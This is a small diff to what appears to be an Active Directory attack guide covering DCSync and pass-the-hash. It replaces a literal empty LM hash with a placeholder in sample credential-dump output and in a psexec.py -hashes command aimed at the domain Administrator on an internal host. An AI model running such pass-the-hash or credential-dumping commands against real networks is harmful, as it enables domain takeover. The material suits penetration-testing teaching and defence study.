@@ -179,11 +179,11 @@ highest-yield families: GPP cpassword, LAPS abuse, DCSync, and ACL abuse.
 
     # Expected output:
     # [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-    # Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
-    # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
+    # Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
+    # krbtgt:502:<LM_HASH_EMPTY>:<KRBTGT_HASH>:::
 
     # 2. Use the Administrator hash for PtH
-    psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> corp.local/Administrator@10.10.10.10
+    psexec.py -hashes <LM_HASH_EMPTY>:<NTLM_HASH> corp.local/Administrator@10.10.10.10
 
     # Expected output:
     # [*] Requesting shares on 10.10.10.10.....
